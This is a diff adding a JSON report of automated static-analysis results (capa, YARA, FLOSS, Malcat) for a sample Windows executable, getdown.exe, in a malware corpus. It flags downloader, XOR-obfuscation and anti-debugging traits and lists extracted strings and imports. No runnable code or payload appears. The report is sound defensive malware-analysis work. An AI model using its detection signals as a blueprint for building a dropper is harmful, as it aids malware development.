@@ -1,0 +1,3271 @@
+{
+  "capa": {
+    "rule_count": 8,
+    "top_rules": [
+      {
+        "name": "encode data using XOR",
+        "attack": [
+          {
+            "parts": [
+              "Defense Evasion",
+              "Obfuscated Files or Information"
+            ],
+            "tactic": "Defense Evasion",
+            "technique": "Obfuscated Files or Information",
+            "subtechnique": "",
+            "id": "T1027"
+          }
+        ],
+        "mbc": [
+          {
+            "parts": [
+              "Defense Evasion",
+              "Obfuscated Files or Information",
+              "Encoding-Standard Algorithm"
+            ],
+            "objective": "Defense Evasion",
+            "behavior": "Obfuscated Files or Information",
+            "method": "Encoding-Standard Algorithm",
+            "id": "E1027.m02"
+          },
+          {
+            "parts": [
+              "Data",
+              "Encode Data",
+              "XOR"
+            ],
+            "objective": "Data",
+            "behavior": "Encode Data",
+            "method": "XOR",
+            "id": "C0026.002"
+          }
+        ]
+      },
+      {
+        "name": "get common file path",
+        "attack": [
+          {
+            "parts": [
+              "Discovery",
+              "File and Directory Discovery"
+            ],
+            "tactic": "Discovery",
+            "technique": "File and Directory Discovery",
+            "subtechnique": "",
+            "id": "T1083"
+          }
+        ],
+        "mbc": [
+          {
+            "parts": [
+              "Discovery",
+              "File and Directory Discovery"
+            ],
+            "objective": "Discovery",
+            "behavior": "File and Directory Discovery",
+            "method": "",
+            "id": "E1083"
+          }
+        ]
+      },
+      {
+        "name": "receive data",
+        "attack": [],
+        "mbc": [
+          {
+            "parts": [
+              "Command and Control",
+              "C2 Communication",
+              "Receive Data"
+            ],
+            "objective": "Command and Control",
+            "behavior": "C2 Communication",
+            "method": "Receive Data",
+            "id": "B0030.002"
+          }
+        ]
+      },
+      {
+        "name": "download URL",
+        "attack": [],
+        "mbc": [
+          {
+            "parts": [
+              "Communication",
+              "HTTP Communication",
+              "Download URL"
+            ],
+            "objective": "Communication",
+            "behavior": "HTTP Communication",
+            "method": "Download URL",
+            "id": "C0002.006"
+          }
+        ]
+      },
+      {
+        "name": "create process on Windows",
+        "attack": [],
+        "mbc": [
+          {
+            "parts": [
+              "Process",
+              "Create Process"
+            ],
+            "objective": "Process",
+            "behavior": "Create Process",
+            "method": "",
+            "id": "C0017"
+          }
+        ]
+      },
+      {
+        "name": "terminate process",
+        "attack": [],
+        "mbc": [
+          {
+            "parts": [
+              "Process",
+              "Terminate Process"
+            ],
+            "objective": "Process",
+            "behavior": "Terminate Process",
+            "method": "",
+            "id": "C0018"
+          }
+        ]
+      },
+      {
+        "name": "link function at runtime on Windows",
+        "attack": [
+          {
+            "parts": [
+              "Execution",
+              "Shared Modules"
+            ],
+            "tactic": "Execution",
+            "technique": "Shared Modules",
+            "subtechnique": "",
+            "id": "T1129"
+          }
+        ],
+        "mbc": []
+      },
+      {
+        "name": "link many functions at runtime",
+        "attack": [
+          {
+            "parts": [
+              "Execution",
+              "Shared Modules"
+            ],
+            "tactic": "Execution",
+            "technique": "Shared Modules",
+            "subtechnique": "",
+            "id": "T1129"
+          }
+        ],
+        "mbc": []
+      }
+    ],
+    "timeout_s": 300,
+    "sample_size": 38912,
+    "duration_s": 1.96,
+    "engine": "malcat-capa",
+    "capa_bin": "/opt/malcat/bin/malcat.capa.py"
+  },
+  "pe_imports": {
+    "engine": "pe_imports",
+    "sample_size": 38912,
+    "duration_s": 0.02,
+    "import_count": 60,
+    "signal_count": 5,
+    "signals": [
+      {
+        "label": "check_debugger",
+        "api_match": "IsDebuggerPresent",
+        "attack": [
+          "T1622"
+        ]
+      },
+      {
+        "label": "download_file",
+        "api_match": "URLDownloadToFile",
+        "attack": [
+          "T1105"
+        ]
+      },
+      {
+        "label": "create_process",
+        "api_match": "CreateProcess",
+        "attack": [
+          "T1106"
+        ]
+      },
+      {
+        "label": "load_library",
+        "api_match": "LoadLibrary",
+        "attack": [
+          "T1129"
+        ]
+      },
+      {
+        "label": "get_proc_address",
+        "api_match": "GetProcAddress",
+        "attack": [
+          "T1129"
+        ]
+      }
+    ],
+    "hint": "PE import high-signal map (pefile). Not capa."
+  },
+  "yara": {
+    "rule_count": 8,
+    "matches": [
+      {
+        "rule": "domain",
+        "path": "/opt/samples/corpus/malware/cd78cf4af8e37b4a9de479867167027887a28527e2738c481a1c6891d707f21a/getdown.exe",
+        "strings": [
+          {
+            "id": "$domain_regex",
+            "offset": 0,
+            "length": 2,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "contains_base64",
+        "path": "/opt/samples/corpus/malware/cd78cf4af8e37b4a9de479867167027887a28527e2738c481a1c6891d707f21a/getdown.exe",
+        "strings": [
+          {
+            "id": "$a",
+            "offset": 23136,
+            "length": 12,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "IsPE64",
+        "path": "/opt/samples/corpus/malware/cd78cf4af8e37b4a9de479867167027887a28527e2738c481a1c6891d707f21a/getdown.exe",
+        "strings": []
+      },
+      {
+        "rule": "IsWindowsGUI",
+        "path": "/opt/samples/corpus/malware/cd78cf4af8e37b4a9de479867167027887a28527e2738c481a1c6891d707f21a/getdown.exe",
+        "strings": []
+      },
+      {
+        "rule": "HasRichSignature",
+        "path": "/opt/samples/corpus/malware/cd78cf4af8e37b4a9de479867167027887a28527e2738c481a1c6891d707f21a/getdown.exe",
+        "strings": [
+          {
+            "id": "$a0",
+            "offset": 200,
+            "length": 4,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "Microsoft_Visual_Cpp_80_DLL",
+        "path": "/opt/samples/corpus/malware/cd78cf4af8e37b4a9de479867167027887a28527e2738c481a1c6891d707f21a/getdown.exe",
+        "strings": [
+          {
+            "id": "$b",
+            "offset": 2880,
+            "length": 4,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "anti_dbg",
+        "path": "/opt/samples/corpus/malware/cd78cf4af8e37b4a9de479867167027887a28527e2738c481a1c6891d707f21a/getdown.exe",
+        "strings": [
+          {
+            "id": "$d1",
+            "offset": 31234,
+            "length": 12,
+            "xor_key": null
+          },
+          {
+            "id": "$c2",
+            "offset": 31200,
+            "length": 17,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "network_dropper",
+        "path": "/opt/samples/corpus/malware/cd78cf4af8e37b4a9de479867167027887a28527e2738c481a1c6891d707f21a/getdown.exe",
+        "strings": [
+          {
+            "id": "$f1",
+            "offset": 31270,
+            "length": 10,
+            "xor_key": null
+          },
+          {
+            "id": "$c1",
+            "offset": 31250,
+            "length": 17,
+            "xor_key": null
+          }
+        ]
+      }
+    ],
+    "engine": "yara-x",
+    "rules_compiled": 454,
+    "compile_errors": [
+      "/opt/samples/rules/flat/Android_Amtrckr_20160519.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_Amtrckr_20160519.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Android_Backdoor.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Backdoor.yar:11:1\n   |\n11 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/MALW_Httpsd_ELF.yar: error[E009]: unknown identifier `is__elf`\n  --> /opt/samples/rules/flat/MALW_Httpsd_ELF.yar:54:14\n   |\n54 |          and is__elf\n   |              ^^^^^^^ this identifier has not been declared",
+      "/opt/samples/rules/flat/Android_Pink_Locker.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Pink_Locker.yar:10:1\n   |\n10 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Android_pornClicker.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_pornClicker.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Android_Spywaller.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Spywaller.yar:10:1\n   |\n10 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Android_OmniRat.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_OmniRat.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Wshell_ChineseSpam.yar: error[E014]: invalid regular expression\n  --> /opt/samples/rules/flat/Wshell_ChineseSpam.yar:17:42\n   |\n17 |         $c = /if ?\\(\\$_POST\\[Submit\\]\\) ?{/\n   |                                          ^ unclosed counted repetition\n   |\n   = note: did you mean `\\{` instead of `{`?",
+      "/opt/samples/rules/flat/Android_FakeBank_Fanta.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_FakeBank_Fanta.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Android_AliPay_smsStealer.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_AliPay_smsStealer.yar:11:1\n   |\n11 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found"
+    ],
+    "incomplete": true,
+    "duration_s": 3.76
+  },
+  "floss": {
+    "floss_ok": true,
+    "string_count": 173,
+    "strings_sampled": 80,
+    "strings": [
+      "!This program cannot be run in DOS mode.",
+      "`.rdata",
+      "@.data",
+      ".pdata",
+      "@.reloc",
+      "WATAUAVAWH",
+      "@A_A^A]A\\_",
+      "t$ WATAUH",
+      "A_A^A]A\\_",
+      "x ATAUAVH",
+      "< tG<\ttC",
+      "A^A]A\\",
+      "Hct$@H",
+      "s\\HcL$HH",
+      "ATAUAVH",
+      "fD9t$b",
+      "0A_A^A]A\\_",
+      "LcA<E3",
+      "@SUVWATAUAVH",
+      "PA^A]A\\_^][",
+      "UVWATAUH",
+      "D$&8\\$&t-8X",
+      "@A]A\\_^]",
+      "fffffff",
+      "@UATAUAVAWH",
+      "!t$(H!t$ A",
+      "A_A^A]A\\]",
+      "CorExitProcess",
+      "GetProcessWindowStation",
+      "GetUserObjectInformationW",
+      "GetLastActivePopup",
+      "GetActiveWindow",
+      "MessageBoxW",
+      "HH:mm:ss",
+      "dddd, MMMM dd, yyyy",
+      "MM/dd/yy",
+      "December",
+      "November",
+      "October",
+      "September",
+      "August",
+      "February",
+      "January",
+      "Saturday",
+      "Friday",
+      "Thursday",
+      "Wednesday",
+      "Tuesday",
+      "Monday",
+      "Sunday",
+      "!\"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~",
+      "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~",
+      "CreateProcessA",
+      "GetTempFileNameA",
+      "IsDebuggerPresent",
+      "GetTempPathA",
+      "KERNEL32.dll",
+      "URLDownloadToFileA",
+      "urlmon.dll",
+      "GetCommandLineA",
+      "GetStartupInfoW",
+      "TerminateProcess",
+      "GetCurrentProcess",
+      "UnhandledExceptionFilter",
+      "SetUnhandledExceptionFilter",
+      "RtlVirtualUnwind",
+      "RtlLookupFunctionEntry",
+      "RtlCaptureContext",
+      "GetProcAddress",
+      "GetModuleHandleW",
+      "ExitProcess",
+      "DecodePointer",
+      "WriteFile",
+      "GetStdHandle",
+      "GetModuleFileNameW",
+      "RtlUnwindEx",
+      "GetModuleFileNameA",
+      "FreeEnvironmentStringsW",
+      "WideCharToMultiByte",
+      "GetEnvironmentStringsW"
+    ],
+    "per_category": {
+      "decoded_strings": 0,
+      "stack_strings": 0,
+      "tight_strings": 0,
+      "language_strings": 0,
+      "language_strings_missed": 0,
+      "static_strings": 173
+    },
+    "raw_key_total": 3,
+    "floss_profile": "full",
+    "floss_language": "none",
+    "duration_s": 8.21,
+    "size_bytes": 38912,
+    "static_only": false,
+    "size_exceeded_deobfuscate_limit": false
+  },
+  "malcat": {
+    "analysis_id": 1,
+    "path": "/opt/samples/corpus/malware/cd78cf4af8e37b4a9de479867167027887a28527e2738c481a1c6891d707f21a/getdown.exe",
+    "profile": "deep",
+    "limits": {
+      "strings_max": 300,
+      "imports_max": 300,
+      "functions_max": 30,
+      "anomaly_locations_max": 50,
+      "decompile_top_n": 3
+    },
+    "file_summary": {
+      "analysis_id": 1,
+      "file_name": "getdown.exe",
+      "file_path": "/opt/samples/corpus/malware/cd78cf4af8e37b4a9de479867167027887a28527e2738c481a1c6891d707f21a/getdown.exe",
+      "file_size": 38912,
+      "type": "PE",
+      "architecture": "X64",
+      "entropy": 5.54,
+      "sha256": "cd78cf4af8e37b4a9de479867167027887a28527e2738c481a1c6891d707f21a",
+      "metadata": {},
+      "entrypoint_ea": 2880,
+      "layout": [
+        {
+          "name": "header",
+          "effective_address": 0,
+          "physical_size": 1024,
+          "virtual_size": 0,
+          "rights": "",
+          "entropy": 45
+        },
+        {
+          "name": ".text",
+          "effective_address": 1024,
+          "physical_size": 21504,
+          "virtual_size": 24576,
+          "rights": "RX",
+          "entropy": 129
+        },
+        {
+          "name": ".rdata",
+          "effective_address": 25600,
+          "physical_size": 10240,
+          "virtual_size": 12288,
+          "rights": "R",
+          "entropy": 56
+        },
+        {
+          "name": ".data",
+          "effective_address": 37888,
+          "physical_size": 4096,
+          "virtual_size": 12288,
+          "rights": "RW",
+          "entropy": 82
+        },
+        {
+          "name": ".pdata",
+          "effective_address": 50176,
+          "physical_size": 1536,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 15
+        },
+        {
+          "name": ".reloc",
+          "effective_address": 54272,
+          "physical_size": 512,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 37
+        }
+      ],
+      "kesakode_verdict": [],
+      "entropy_malcat_raw": 104,
+      "entropy_source": "whole_file_shannon_revai"
+    },
+    "views": {
+      "anomalies": [
+        {
+          "name": "DownloaderApiUsage",
+          "desc": "Downloader-related apis are used",
+          "category": "imports",
+          "level": 2,
+          "num_hits": 1
+        },
+        {
+          "name": "GuiSubsystemNoWindowApi",
+          "desc": "A GUI windows application does not import any user32 window-related function",
+          "category": "headers",
+          "level": 2,
+          "num_hits": 1
+        },
+        {
+          "name": "NoChecksum",
+          "desc": "PE Header checksum is not set",
+          "category": "integrity",
+          "level": 1,
+          "num_hits": 1
+        },
+        {
+          "name": "SpaghettiFunction",
+          "desc": "Function with lots of intra jumps, could be obfuscated",
+          "category": "code",
+          "level": 1,
+          "num_hits": 6
+        },
+        {
+          "name": "XorInLoop",
+          "desc": "XOR instruction in a loop",
+          "category": "code",
+          "level": 3,
+          "num_hits": 6
+        }
+      ],
+      "anomaly_locations": {
+        "GuiSubsystemNoWindowApi": [
+          {
+            "ea": 316,
+            "context": ""
+          }
+        ],
+        "NoChecksum": [
+          {
+            "ea": 312,
+            "context": ""
+          }
+        ],
+        "SpaghettiFunction": [
+          {
+            "ea": 1680,
+            "context": ""
+          },
+          {
+            "ea": 2112,
+            "context": ""
+          },
+          {
+            "ea": 5516,
+            "context": ""
+          },
+          {
+            "ea": 6408,
+            "context": ""
+          },
+          {
+            "ea": 10028,
+            "context": ""
+          }
+        ],
+        "XorInLoop": [
+          {
+            "ea": 1171,
+            "context": ""
+          },
+          {
+            "ea": 1202,
+            "context": ""
+          },
+          {
+            "ea": 1712,
+            "context": ""
+          },
+          {
+            "ea": 1889,
+            "context": ""
+          },
+          {
+            "ea": 2177,
+            "context": ""
+          }
+        ]
+      },
+      "yara_hits": [
+        {
+          "id": "MSVC_2010_linker",
+          "category": "compiler",
+          "reliability": 60,
+          "type": "INFO",
+          "description": "detects used visual studio version based on linker information",
+          "num_patterns": 0
+        },
+        {
+          "id": "msvs2010_rich",
+          "category": "compiler",
+          "reliability": 80,
+          "type": "INFO",
+          "description": "detects used visual studio version based on rich header information",
+          "num_patterns": 0
+        },
+        {
+          "id": "DownloadUsingWininet",
+          "category": "network",
+          "reliability": 60,
+          "type": "UNCOMMON",
+          "description": "can download files from internet using wininet API",
+          "num_patterns": 1
+        },
+        {
+          "id": "msvc_general_x64",
+          "category": "compiler",
+          "reliability": 50,
+          "type": "INFO",
+          "description": "",
+          "num_patterns": 1
+        }
+      ],
+      "strings": [
+        {
+          "ea": 26224,
+          "summary": "mscoree.dll"
+        },
+        {
+          "ea": 29384,
+          "summary": "USER32.DLL"
+        },
+        {
+          "ea": 29272,
+          "summary": "GetProcessWindowStation"
+        },
+        {
+          "ea": 34322,
+          "summary": "URLDownloadToFileA"
+        },
+        {
+          "ea": 29296,
+          "summary": "GetUserObjectInformationW"
+        },
+        {
+          "ea": 29328,
+          "summary": "GetLastActivePopup"
+        },
+        {
+          "ea": 29352,
+          "summary": "GetActiveWindow"
+        },
+        {
+          "ea": 26208,
+          "summary": "CorExitProcess"
+        },
+        {
+          "ea": 29368,
+          "summary": "MessageBoxW"
+        },
+        {
+          "ea": 29408,
+          "summary": "HH:mm:ss"
+        },
+        {
+          "ea": 29472,
+          "summary": "MM/dd/yy"
+        },
+        {
+          "ea": 34306,
+          "summary": "KERNEL32.dll"
+        },
+        {
+          "ea": 34342,
+          "summary": "urlmon.dll"
+        },
+        {
+          "ea": 29432,
+          "summary": "dddd, MMMM dd, yyyy"
+        },
+        {
+          "ea": 26248,
+          "summary": "runtime error "
+        },
+        {
+          "ea": 29512,
+          "summary": "December"
+        },
+        {
+          "ea": 30008,
+          "summary": "HH:mm:ss"
+        },
+        {
+          "ea": 29576,
+          "summary": "September"
+        },
+        {
+          "ea": 30048,
+          "summary": "MM/dd/yy"
+        },
+        {
+          "ea": 29880,
+          "summary": "Wednesday"
+        },
+        {
+          "ea": 29704,
+          "summary": "January"
+        },
+        {
+          "ea": 29816,
+          "summary": "Saturday"
+        },
+        {
+          "ea": 29680,
+          "summary": "February"
+        },
+        {
+          "ea": 29600,
+          "summary": "August"
+        },
+        {
+          "ea": 29536,
+          "summary": "November"
+        },
+        {
+          "ea": 30024,
+          "summary": "dddd, MMMM dd, yyyy"
+        },
+        {
+          "ea": 29904,
+          "summary": "Tuesday"
+        },
+        {
+          "ea": 29560,
+          "summary": "October"
+        },
+        {
+          "ea": 30072,
+          "summary": "December"
+        },
+        {
+          "ea": 29856,
+          "summary": "Thursday"
+        },
+        {
+          "ea": 29648,
+          "summary": "April"
+        },
+        {
+          "ea": 29664,
+          "summary": "March"
+        },
+        {
+          "ea": 29840,
+          "summary": "Friday"
+        },
+        {
+          "ea": 30112,
+          "summary": "September"
+        },
+        {
+          "ea": 29920,
+          "summary": "Monday"
+        },
+        {
+          "ea": 29936,
+          "summary": "Sunday"
+        },
+        {
+          "ea": 30280,
+          "summary": "Wednesday"
+        },
+        {
+          "ea": 29632,
+          "summary": "June"
+        },
+        {
+          "ea": 29616,
+          "summary": "July"
+        },
+        {
+          "ea": 30124,
+          "summary": "August"
+        },
+        {
+          "ea": 30088,
+          "summary": "November"
+        },
+        {
+          "ea": 30168,
+          "summary": "February"
+        },
+        {
+          "ea": 30184,
+          "summary": "January"
+        },
+        {
+          "ea": 30240,
+          "summary": "Saturday"
+        },
+        {
+          "ea": 31122,
+          "summary": "         h((((  ..               H"
+        },
+        {
+          "ea": 30104,
+          "summary": "October"
+        },
+        {
+          "ea": 30296,
+          "summary": "Tuesday"
+        },
+        {
+          "ea": 30264,
+          "summary": "Thursday"
+        },
+        {
+          "ea": 30252,
+          "summary": "Friday"
+        },
+        {
+          "ea": 30304,
+          "summary": "Monday"
+        },
+        {
+          "ea": 30156,
+          "summary": "March"
+        },
+        {
+          "ea": 30148,
+          "summary": "April"
+        },
+        {
+          "ea": 30312,
+          "summary": "Sunday"
+        },
+        {
+          "ea": 30140,
+          "summary": "June"
+        },
+        {
+          "ea": 30132,
+          "summary": "July"
+        },
+        {
+          "ea": 30608,
+          "summary": "         (((((  ..               H"
+        },
+        {
+          "ea": 32192,
+          "summary": " !\"#$%&'()*+,-./..OPQRSTUVWXYZ{|}~"
+        },
+        {
+          "ea": 34802,
+          "summary": "InitializeCritic..tionAndSpinCount"
+        },
+        {
+          "ea": 31808,
+          "summary": " !\"#$%&'()*+,-./..opqrstuvwxyz{|}~"
+        },
+        {
+          "ea": 28848,
+          "summary": "Microsoft Visual.. Runtime Library"
+        },
+        {
+          "ea": 35114,
+          "summary": "GetSystemTimeAsFileTime"
+        },
+        {
+          "ea": 28944,
+          "summary": "<program name unknown>"
+        },
+        {
+          "ea": 34460,
+          "summary": "SetUnhandledExceptionFilter"
+        },
+        {
+          "ea": 34856,
+          "summary": "DeleteCriticalSection"
+        },
+        {
+          "ea": 28992,
+          "summary": "Runtime Error!\n\nProgram: "
+        },
+        {
+          "ea": 35050,
+          "summary": "QueryPerformanceCounter"
+        },
+        {
+          "ea": 35164,
+          "summary": "EnterCriticalSection"
+        },
+        {
+          "ea": 26992,
+          "summary": "R6031\r\n- Attempt..r application.\r\n"
+        },
+        {
+          "ea": 34710,
+          "summary": "FreeEnvironmentStringsW"
+        },
+        {
+          "ea": 77,
+          "summary": "!This program ca..in DOS mode.\r\r\n$"
+        },
+        {
+          "ea": 34758,
+          "summary": "GetEnvironmentStringsW"
+        },
+        {
+          "ea": 34432,
+          "summary": "UnhandledExceptionFilter"
+        },
+        {
+          "ea": 35140,
+          "summary": "LeaveCriticalSection"
+        },
+        {
+          "ea": 34272,
+          "summary": "IsDebuggerPresent"
+        },
+        {
+          "ea": 18036,
+          "summary": "ffff"
+        },
+        {
+          "ea": 17796,
+          "summary": "ffff"
+        },
+        {
+          "ea": 34412,
+          "summary": "GetCurrentProcess"
+        },
+        {
+          "ea": 34950,
+          "summary": "GetCurrentThreadId"
+        },
+        {
+          "ea": 34510,
+          "summary": "RtlLookupFunctionEntry"
+        },
+        {
+          "ea": 35092,
+          "summary": "GetCurrentProcessId"
+        },
+        {
+          "ea": 34536,
+          "summary": "RtlCaptureContext"
+        },
+        {
+          "ea": 35000,
+          "summary": "HeapSetInformation"
+        },
+        {
+          "ea": 27456,
+          "summary": "R6026\r\n- not eno..initialization\r\n"
+        },
+        {
+          "ea": 26384,
+          "summary": "R6033\r\n- Attempt.. from DllMain.\r\n"
+        },
+        {
+          "ea": 17537,
+          "summary": "fffffff"
+        },
+        {
+          "ea": 34556,
+          "summary": "GetProcAddress"
+        },
+        {
+          "ea": 17953,
+          "summary": "fffffff"
+        },
+        {
+          "ea": 34234,
+          "summary": "CreateProcessA"
+        },
+        {
+          "ea": 34490,
+          "summary": "RtlVirtualUnwind"
+        },
+        {
+          "ea": 34392,
+          "summary": "TerminateProcess"
+        },
+        {
+          "ea": 34652,
+          "summary": "GetModuleFileNameW"
+        },
+        {
+          "ea": 34574,
+          "summary": "GetModuleHandleW"
+        },
+        {
+          "ea": 34252,
+          "summary": "GetTempFileNameA"
+        },
+        {
+          "ea": 34688,
+          "summary": "GetModuleFileNameA"
+        },
+        {
+          "ea": 27344,
+          "summary": "R6027\r\n- not eno..initialization\r\n"
+        },
+        {
+          "ea": 35036,
+          "summary": "HeapCreate"
+        },
+        {
+          "ea": 34934,
+          "summary": "SetLastError"
+        },
+        {
+          "ea": 34972,
+          "summary": "GetLastError"
+        },
+        {
+          "ea": 34636,
+          "summary": "GetStdHandle"
+        },
+        {
+          "ea": 26880,
+          "summary": "R6032\r\n- not eno..le information\r\n"
+        },
+        {
+          "ea": 35188,
+          "summary": "LoadLibraryW"
+        },
+        {
+          "ea": 27648,
+          "summary": "R6024\r\n- not eno..t/atexit table\r\n"
+        },
+        {
+          "ea": 34924,
+          "summary": "FlsFree"
+        },
+        {
+          "ea": 34736,
+          "summary": "WideCharToMultiByte"
+        },
+        {
+          "ea": 34608,
+          "summary": "DecodePointer"
+        },
+        {
+          "ea": 34784,
+          "summary": "SetHandleCount"
+        },
+        {
+          "ea": 34880,
+          "summary": "EncodePointer"
+        },
+        {
+          "ea": 34988,
+          "summary": "FlsAlloc"
+        },
+        {
+          "ea": 34356,
+          "summary": "GetCommandLineA"
+        },
+        {
+          "ea": 35304,
+          "summary": "MultiByteToWideChar"
+        },
+        {
+          "ea": 35256,
+          "summary": "HeapFree"
+        },
+        {
+          "ea": 35238,
+          "summary": "IsValidCodePage"
+        },
+        {
+          "ea": 34624,
+          "summary": "WriteFile"
+        },
+        {
+          "ea": 35326,
+          "summary": "GetStringTypeW"
+        },
+        {
+          "ea": 34292,
+          "summary": "GetTempPathA"
+        },
+        {
+          "ea": 28400,
+          "summary": "R6002\r\n- floatin..ort not loaded\r\n"
+        },
+        {
+          "ea": 35356,
+          "summary": "HeapReAlloc"
+        },
+        {
+          "ea": 34910,
+          "summary": "FlsSetValue"
+        },
+        {
+          "ea": 34896,
+          "summary": "FlsGetValue"
+        },
+        {
+          "ea": 34842,
+          "summary": "GetFileType"
+        },
+        {
+          "ea": 34374,
+          "summary": "GetStartupInfoW"
+        },
+        {
+          "ea": 27936,
+          "summary": "R6017\r\n- unexpec..ead lock error\r\n"
+        },
+        {
+          "ea": 488,
+          "summary": ".text"
+        },
+        {
+          "ea": 35268,
+          "summary": "Sleep"
+        },
+        {
+          "ea": 39953,
+          "summary": "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        },
+        {
+          "ea": 39422,
+          "summary": "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        },
+        {
+          "ea": 608,
+          "summary": ".pdata"
+        },
+        {
+          "ea": 567,
+          "summary": "@.data"
+        },
+        {
+          "ea": 28032,
+          "summary": "R6016\r\n- not eno..or thread data\r\n"
+        },
+        {
+          "ea": 527,
+          "summary": "`.rdata"
+        },
+        {
+          "ea": 35076,
+          "summary": "GetTickCount"
+        },
+        {
+          "ea": 34674,
+          "summary": "RtlUnwindEx"
+        },
+        {
+          "ea": 35344,
+          "summary": "HeapAlloc"
+        },
+        {
+          "ea": 35022,
+          "summary": "GetVersion"
+        },
+        {
+          "ea": 28208,
+          "summary": "R6009\r\n- not eno..or environment\r\n"
+        },
+        {
+          "ea": 28304,
+          "summary": "R6008\r\n- not eno.. for arguments\r\n"
+        },
+        {
+          "ea": 34594,
+          "summary": "ExitProcess"
+        },
+        {
+          "ea": 39390,
+          "summary": "abcdefghijklmnopqrstuvwxyz"
+        },
+        {
+          "ea": 39921,
+          "summary": "abcdefghijklmnopqrstuvwxyz"
+        },
+        {
+          "ea": 27760,
+          "summary": "R6019\r\n- unable ..console device\r\n"
+        },
+        {
+          "ea": 35288,
+          "summary": "LCMapStringW"
+        },
+        {
+          "ea": 35226,
+          "summary": "GetOEMCP"
+        },
+        {
+          "ea": 35276,
+          "summary": "HeapSize"
+        },
+        {
+          "ea": 35204,
+          "summary": "GetCPInfo"
+        },
+        {
+          "ea": 27568,
+          "summary": "R6025\r\n- pure vi.. function call\r\n"
+        },
+        {
+          "ea": 35216,
+          "summary": "GetACP"
+        },
+        {
+          "ea": 647,
+          "summary": "@.reloc"
+        },
+        {
+          "ea": 27264,
+          "summary": "R6028\r\n- unable ..nitialize heap\r\n"
+        },
+        {
+          "ea": 199,
+          "summary": "PRich"
+        },
+        {
+          "ea": 31376,
+          "summary": "                ..               H"
+        },
+        {
+          "ea": 27856,
+          "summary": "R6018\r\n- unexpected heap error\r\n"
+        },
+        {
+          "ea": 27192,
+          "summary": "R6030\r\n- CRT not initialized\r\n"
+        },
+        {
+          "ea": 28128,
+          "summary": "R6010\r\n- abort()..as been called\r\n"
+        },
+        {
+          "ea": 26288,
+          "summary": "TLOSS error\r\n"
+        },
+        {
+          "ea": 26352,
+          "summary": "DOMAIN error\r\n"
+        },
+        {
+          "ea": 26320,
+          "summary": "SING error\r\n"
+        },
+        {
+          "ea": 39166,
+          "summary": "                          "
+        },
+        {
+          "ea": 39682,
+          "summary": "                          "
+        }
+      ],
+      "imports": [
+        {
+          "ea": 1632,
+          "name": "__security_check_cookie",
+          "type": "DEBUG",
+          "num_refs": 10
+        },
+        {
+          "ea": 1680,
+          "name": "strncat",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 2112,
+          "name": "strncpy",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 2468,
+          "name": "__tmainCRTStartup",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 2880,
+          "name": "mainCRTStartup",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 2900,
+          "name": "__report_gsfailure",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 3232,
+          "name": "__CxxUnhandledExceptionFilter",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 3300,
+          "name": "__CxxSetUnhandledExceptionFilter",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 3324,
+          "name": "__crtCorExitProcess",
+          "type": "DEBUG",
+          "num_refs": 4
+        },
+        {
+          "ea": 3408,
+          "name": "_lockexit",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 3420,
+          "name": "_unlockexit",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 3432,
+          "name": "_init_pointers",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 3500,
+          "name": "_initterm",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 3552,
+          "name": "_initterm_e",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 3612,
+          "name": "_cinit",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 3788,
+          "name": "doexit",
+          "type": "DEBUG",
+          "num_refs": 6
+        },
+        {
